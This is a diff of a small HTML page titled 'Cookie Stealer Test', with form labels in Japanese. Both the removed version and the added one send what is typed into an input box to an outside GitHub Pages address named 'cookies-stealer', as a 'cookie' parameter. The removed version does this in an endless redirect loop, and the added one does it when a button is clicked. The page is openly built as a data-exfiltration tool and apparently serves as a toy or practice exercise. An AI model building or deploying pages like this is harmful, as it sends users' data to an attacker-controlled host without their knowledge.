@@ -1,13 +1,18 @@
-<input>
-</input>
-<script>
-	var input = document.querySelector('.input'); 
-	var input_text = "";
-	var a = true
-	while (a) {
-		input_text = input.value;
-		console.log(input.value);
-		location.href="https://masa-pokemon.github.io/cookies-stealer/?cookie="+input_text;
-		history.back();
-	}
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Cookie Stealer Test</title>
+</head>
+<body>
+  <input type="text" id="inputText" placeholder="入力してください">
+  <button onclick="sendInput()">送信</button>
+
+  <script>
+    function sendInput() {
+      const input = document.getElementById('inputText').value;
+      location.href = "https://masa-pokemon.github.io/cookies-stealer/?cookie=" + encodeURIComponent(input);
+    }
+  </script>
+</body>
+</html>
